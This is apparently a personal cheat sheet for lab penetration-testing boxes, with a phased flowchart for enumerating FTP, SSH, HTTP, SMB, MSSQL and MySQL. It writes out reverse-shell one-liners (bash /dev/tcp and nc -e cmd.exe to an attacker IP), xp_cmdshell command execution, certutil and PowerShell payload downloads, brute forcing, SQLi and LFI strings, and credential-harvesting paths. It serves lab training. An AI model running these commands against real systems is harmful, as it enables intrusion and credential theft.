# 🎯 MASTER ENUMERATION CHEAT SHEET

**Author:** Andrew Mullins  
**Last Updated:** February 7, 2026  
**Purpose:** Systematic approach for every new box

---

## 📊 THE MASTER FLOWCHART

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         🚀 NEW BOX - START HERE                              │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  PHASE 1: RECONNAISSANCE (5-10 min)                                         │
│  ═══════════════════════════════════                                        │
│  □ ping TARGET_IP                    ← Verify connectivity                  │
│  □ nmap -sC -sV -p- TARGET_IP        ← Full port scan + versions            │
│  □ Note ALL open ports               ← Document everything                  │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  PHASE 2: SERVICE IDENTIFICATION - What ports are open?                     │
│  ═══════════════════════════════════════════════════════                    │
│                                                                             │
│  ┌──────────┬──────────┬──────────┬──────────┬──────────┬──────────┐       │
│  │ PORT 21  │ PORT 22  │ PORT 80  │ PORT 445 │ PORT 1433│ PORT 3306│       │
│  │   FTP    │   SSH    │   HTTP   │   SMB    │  MSSQL   │  MySQL   │       │
│  │    ↓     │    ↓     │    ↓     │    ↓     │    ↓     │    ↓     │       │
│  │ Go to A  │ Go to B  │ Go to C  │ Go to D  │ Go to E  │ Go to F  │       │
│  └──────────┴──────────┴──────────┴──────────┴──────────┴──────────┘       │
│                                                                             │
│  Other common ports: 23(Telnet), 25(SMTP), 53(DNS), 110(POP3),             │
│  139(NetBIOS), 443(HTTPS), 3389(RDP), 5432(PostgreSQL), 6379(Redis)        │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                    ┌─────────────────┼─────────────────┐
                    ▼                 ▼                 ▼
        ┌───────────────────┐ ┌───────────────┐ ┌───────────────┐
        │ EASY WINS FIRST!  │ │ CREDENTIALS?  │ │ WEB VULNS?    │
        │ Anonymous access  │ │ Try creds on  │ │ SQLi, LFI,    │
        │ Default creds     │ │ other services│ │ RCE, etc.     │
        └───────────────────┘ └───────────────┘ └───────────────┘
                    │                 │                 │
                    └─────────────────┼─────────────────┘
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  PHASE 3: INITIAL ACCESS ACHIEVED                                           │
│  ═══════════════════════════════════                                        │
│  □ Stabilize shell (python pty, etc.)                                       │
│  □ whoami / id                       ← What user are we?                    │
│  □ pwd / hostname                    ← Where are we?                        │
│  □ Get USER FLAG                     ← Usually in ~/Desktop or /home/user   │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  PHASE 4: PRIVILEGE ESCALATION                                              │
│  ═══════════════════════════════                                            │
│  □ sudo -l                           ← FIRST CHECK ALWAYS                   │
│  □ Upload LinPEAS/WinPEAS            ← Full enumeration                     │
│  □ Check history files               ← .bash_history, ConsoleHost_history   │
│  □ Look for credentials              ← Config files, scripts, env vars      │
│  □ SUID binaries / Scheduled tasks   ← GTFOBins check                       │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  PHASE 5: ROOT ACCESS                                                       │
│  ═════════════════════                                                      │
│  □ Get ROOT FLAG                     ← /root/root.txt or Admin Desktop      │
│  □ Document everything               ← Write the writeup!                   │
│  □ BOX PWNED ✅                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🔤 SERVICE-SPECIFIC ENUMERATION

### A) FTP - Port 21
```
┌─────────────────────────────────────────────────────────────┐
│                    FTP ENUMERATION                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. TRY ANONYMOUS LOGIN FIRST                               │
│     ftp TARGET_IP                                           │
│     Username: anonymous                                     │
│     Password: (blank)                                       │
│                                                             │
│  2. IF LOGGED IN:                                           │
│     ls -la              ← List ALL files (hidden too)       │
│     get filename        ← Download files                    │
│     cd ..               ← Check parent directories          │
│                                                             │
│  3. LOOK FOR:                                               │
│     • Usernames (for SSH/other services)                    │
│     • Config files (.conf, .config, .xml)                   │
│     • Credentials in text files                             │
│     • Backup files (.bak, .old)                             │
│                                                             │
│  4. IF ANONYMOUS FAILS:                                     │
│     Try: ftp/ftp, admin/admin, user/user                    │
│                                                             │
│  BOXES USING THIS: FAWN                                     │
└─────────────────────────────────────────────────────────────┘
```

**Quick Commands:**
```bash
ftp TARGET_IP                           # Connect
nmap --script=ftp-anon -p 21 TARGET_IP  # Check anonymous
```

---

### B) SSH - Port 22
```
┌─────────────────────────────────────────────────────────────┐
│                    SSH ENUMERATION                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. NOTE THE VERSION                                        │
│     nmap -sV -p 22 TARGET_IP                                │
│     → Research CVEs for that version                        │
│                                                             │
│  2. IF YOU HAVE USERNAMES (from FTP/SMB/etc):               │
│     ssh username@TARGET_IP                                  │
│     Try: username as password                               │
│     Try: password, 123456, admin                            │
│                                                             │
│  3. IF YOU HAVE A PRIVATE KEY:                              │
│     chmod 600 id_rsa                                        │
│     ssh -i id_rsa user@TARGET_IP                            │
│                                                             │
│  4. BRUTE FORCE (if allowed):                               │
│     hydra -l user -P wordlist.txt ssh://TARGET_IP           │
│                                                             │
│  BOXES USING THIS: MEOW, ARCHETYPE                          │
└─────────────────────────────────────────────────────────────┘
```

**Quick Commands:**
```bash
ssh user@TARGET_IP                      # Connect
ssh -i key.pem user@TARGET_IP           # With private key
```

---

### C) HTTP/HTTPS - Port 80/443
```
┌─────────────────────────────────────────────────────────────┐
│                    WEB ENUMERATION                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. FINGERPRINT THE SERVER                                  │
│     curl -I http://TARGET_IP          ← Headers/version     │
│     whatweb http://TARGET_IP          ← Technology stack    │
│                                                             │
│  2. CHECK COMMON PATHS                                      │
│     /robots.txt         ← Hidden directories!               │
│     /sitemap.xml        ← Site structure                    │
│     /admin, /login      ← Admin panels                      │
│     /.git               ← Source code leak                  │
│                                                             │
│  3. DIRECTORY BRUTE FORCE                                   │
│     gobuster dir -u http://TARGET_IP -w wordlist.txt        │
│                                                             │
│  4. VIEW PAGE SOURCE (Ctrl+U)                               │
│     Look for: Comments, credentials, API keys, hints        │
│                                                             │
│  5. TEST FOR VULNERABILITIES                                │
│     • SQL Injection: ' OR '1'='1' --                        │
│     • Default creds: admin/admin, admin/password            │
│     • LFI: ?page=../../../../etc/passwd                     │
│                                                             │
│  BOXES USING THIS: APPOINTMENT, CROCODILE, IGNITION         │
└─────────────────────────────────────────────────────────────┘
```

**Quick Commands:**
```bash
curl -I http://TARGET_IP                                    # Headers
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
nikto -h http://TARGET_IP                                   # Vuln scan
```

---

### D) SMB - Port 445
```
┌─────────────────────────────────────────────────────────────┐
│                    SMB ENUMERATION                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. LIST SHARES (NULL SESSION)                              │
│     smbclient -N -L \\\\TARGET_IP\\                         │
│                                                             │
│  2. IDENTIFY SHARE TYPES                                    │
│     ADMIN$, C$, IPC$ = System shares (need admin)           │
│     Custom names = User shares (try these!)                 │
│                                                             │
│  3. CONNECT TO ACCESSIBLE SHARES                            │
│     smbclient -N \\\\TARGET_IP\\sharename                   │
│                                                             │
│  4. ENUMERATE FILES                                         │
│     ls                  ← List files                        │
│     get filename        ← Download file                     │
│     cd directory        ← Change directory                  │
│                                                             │
│  5. LOOK FOR:                                               │
│     • Config files (.config, .xml, .ini)                    │
│     • Credentials                                           │
│     • Usernames                                             │
│     • Backup files                                          │
│                                                             │
│  BOXES USING THIS: DANCING, ARCHETYPE                       │
└─────────────────────────────────────────────────────────────┘
```

**Quick Commands:**
```bash
smbclient -N -L \\\\TARGET_IP\\                # List shares
smbclient -N \\\\TARGET_IP\\share              # Connect to share
nmap --script=smb-enum-shares -p 445 TARGET_IP # Nmap enum
enum4linux TARGET_IP                           # Full SMB enum
```

---

### E) MSSQL - Port 1433
```
┌─────────────────────────────────────────────────────────────┐
│                    MSSQL ENUMERATION                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. CONNECT WITH IMPACKET                                   │
│     python3 mssqlclient.py user@TARGET_IP -windows-auth     │
│                                                             │
│  2. CHECK PRIVILEGES                                        │
│     SELECT is_srvrolemember('sysadmin');                    │
│     → 1 = sysadmin (can run commands!)                      │
│                                                             │
│  3. ENABLE COMMAND EXECUTION                                │
│     EXEC sp_configure 'show advanced options', 1;           │
│     RECONFIGURE;                                            │
│     EXEC sp_configure 'xp_cmdshell', 1;                     │
│     RECONFIGURE;                                            │
│                                                             │
│  4. RUN COMMANDS                                            │
│     xp_cmdshell "whoami"                                    │
│     xp_cmdshell "powershell -c pwd"                         │
│                                                             │
│  5. GET REVERSE SHELL                                       │
│     Upload nc64.exe via PowerShell wget                     │
│     Execute: xp_cmdshell "nc64.exe -e cmd.exe YOUR_IP 443"  │
│                                                             │
│  BOXES USING THIS: ARCHETYPE                                │
└─────────────────────────────────────────────────────────────┘
```

**Quick Commands:**
```bash
# Install impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && pip3 install .

# Connect
python3 mssqlclient.py user@TARGET_IP -windows-auth
```

---

### F) MySQL - Port 3306
```
┌─────────────────────────────────────────────────────────────┐
│                    MySQL ENUMERATION                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. CONNECT                                                 │
│     mysql -h TARGET_IP -u root -p                           │
│     mysql -h TARGET_IP -u root (no password)                │
│                                                             │
│  2. ENUMERATE DATABASES                                     │
│     SHOW databases;                                         │
│     USE database_name;                                      │
│     SHOW tables;                                            │
│     SELECT * FROM users;                                    │
│                                                             │
│  3. LOOK FOR:                                               │
│     • User credentials                                      │
│     • Password hashes                                       │
│     • Sensitive data                                        │
│                                                             │
│  BOXES USING THIS: SEQUEL                                   │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔑 CREDENTIAL DISCOVERY CHECKLIST

```
┌─────────────────────────────────────────────────────────────┐
│              WHERE TO FIND CREDENTIALS                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  📁 CONFIG FILES                                            │
│     • .config, .xml, .ini, .conf, .yml                      │
│     • wp-config.php (WordPress)                             │
│     • web.config (IIS)                                      │
│     • .env files                                            │
│                                                             │
│  📁 HISTORY FILES                                           │
│     • .bash_history (Linux)                                 │
│     • ConsoleHost_history.txt (Windows PowerShell)          │
│       Path: C:\Users\USER\AppData\Roaming\Microsoft\        │
│             Windows\PowerShell\PSReadline\                  │
│                                                             │
│  📁 BACKUP FILES                                            │
│     • .bak, .old, .backup                                   │
│     • prod.dtsConfig (SQL Server)                           │
│                                                             │
│  📁 WEB PAGE SOURCE                                         │
│     • HTML comments                                         │
│     • Hidden form fields                                    │
│     • JavaScript files                                      │
│                                                             │
│  📁 DATABASE TABLES                                         │
│     • users, accounts, credentials                          │
│     • admin, administrators                                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 PRIVILEGE ESCALATION QUICK WINS

```
┌─────────────────────────────────────────────────────────────┐
│           PRIVESC - CHECK THESE FIRST!                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  🐧 LINUX                                                   │
│  ════════                                                   │
│  1. sudo -l                    ← ALWAYS FIRST               │
│     → Check GTFOBins.github.io for exploits                 │
│                                                             │
│  2. find / -perm -4000 2>/dev/null   ← SUID binaries        │
│     → Check GTFOBins for each binary                        │
│                                                             │
│  3. cat /etc/crontab          ← Scheduled tasks             │
│     → Writable scripts = instant root                       │
│                                                             │
│  4. ls -la /home/*            ← Check user files            │
│     → SSH keys, history, configs                            │
│                                                             │
│  5. ./linpeas.sh              ← Full enumeration            │
│                                                             │
│  🪟 WINDOWS                                                 │
│  ══════════                                                 │
│  1. whoami /priv              ← Check privileges            │
│     → SeImpersonatePrivilege = Potato exploits              │
│                                                             │
│  2. Check PowerShell history  ← Credentials!                │
│     Path: C:\Users\USER\AppData\Roaming\Microsoft\          │
│           Windows\PowerShell\PSReadline\                    │
│           ConsoleHost_history.txt                           │
│                                                             │
│  3. .\winPEASx64.exe          ← Full enumeration            │
│                                                             │
│  4. Use psexec.py if you find admin creds                   │
│     python3 psexec.py admin@TARGET_IP                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔧 REVERSE SHELL SETUP

```
┌─────────────────────────────────────────────────────────────┐
│              REVERSE SHELL QUICK SETUP                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ATTACKER MACHINE (Your Kali/Attack Box)                    │
│  ═══════════════════════════════════════                    │
│                                                             │
│  Terminal 1 - HTTP Server (to serve files):                 │
│  sudo python3 -m http.server 80                             │
│                                                             │
│  Terminal 2 - Netcat Listener:                              │
│  sudo nc -lvnp 443                                          │
│                                                             │
│  TARGET MACHINE                                             │
│  ══════════════                                             │
│                                                             │
│  Linux:                                                     │
│  bash -i >& /dev/tcp/YOUR_IP/443 0>&1                       │
│                                                             │
│  Windows (PowerShell):                                      │
│  wget http://YOUR_IP/nc64.exe -outfile nc64.exe             │
│  .\nc64.exe -e cmd.exe YOUR_IP 443                          │
│                                                             │
│  ⚠️ IMPORTANT: Know your file paths!                        │
│     → Where is nc64.exe on YOUR machine?                    │
│     → Where can you WRITE on the target? (usually Downloads)│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 📝 FILE TRANSFER CHEAT SHEET

```
┌─────────────────────────────────────────────────────────────┐
│              FILE TRANSFER METHODS                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LINUX TARGET                                               │
│  ════════════                                               │
│  wget http://YOUR_IP:8000/file.sh                           │
│  curl http://YOUR_IP:8000/file.sh -o file.sh                │
│                                                             │
│  WINDOWS TARGET                                             │
│  ══════════════                                             │
│  powershell wget http://YOUR_IP/file.exe -outfile file.exe  │
│  powershell iwr http://YOUR_IP/file.exe -o file.exe         │
│  certutil -urlcache -f http://YOUR_IP/file.exe file.exe     │
│                                                             │
│  YOUR MACHINE (Serve Files)                                 │
│  ══════════════════════════                                 │
│  python3 -m http.server 8000     ← Serves from current dir  │
│  python3 -m http.server 80       ← Port 80 (needs sudo)     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## ✅ PRE-ATTACK CHECKLIST

Before starting ANY box, make sure you have:

```
□ VPN connected (ping target works)
□ Notes file open (track creds, paths, findings)
□ Terminal windows ready:
  □ Terminal 1: Main working terminal
  □ Terminal 2: HTTP server (when needed)
  □ Terminal 3: Netcat listener (when needed)
□ Tools ready:
  □ linpeas.sh / winPEASx64.exe downloaded
  □ nc64.exe downloaded (for Windows targets)
  □ Wordlists accessible (/usr/share/wordlists/)
```

---

## 🎯 BOX COMPLETION CHECKLIST

```
□ User flag captured: /home/user/user.txt or Desktop
□ Root flag captured: /root/root.txt or Admin Desktop
□ Screenshots taken of key steps
□ Writeup documented
□ Committed to GitHub
□ BOX PWNED ✅
```

---

## 📚 QUICK REFERENCE LINKS

- **GTFOBins:** https://gtfobins.github.io/ (Linux privesc)
- **LOLBAS:** https://lolbas-project.github.io/ (Windows privesc)
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks:** https://book.hacktricks.xyz/
- **MSSQL Injection:** https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

---

## 🔥 REMEMBER

```
1. ENUMERATE FIRST - Don't skip steps
2. EASY WINS FIRST - Anonymous FTP, null SMB, default creds
3. CREDENTIALS ARE GOLD - Found a password? Try it EVERYWHERE
4. KNOW YOUR PATHS - File transfer fails = wrong path
5. DOCUMENT EVERYTHING - Write as you go
```

---

**Status:** BOX READY 🎯
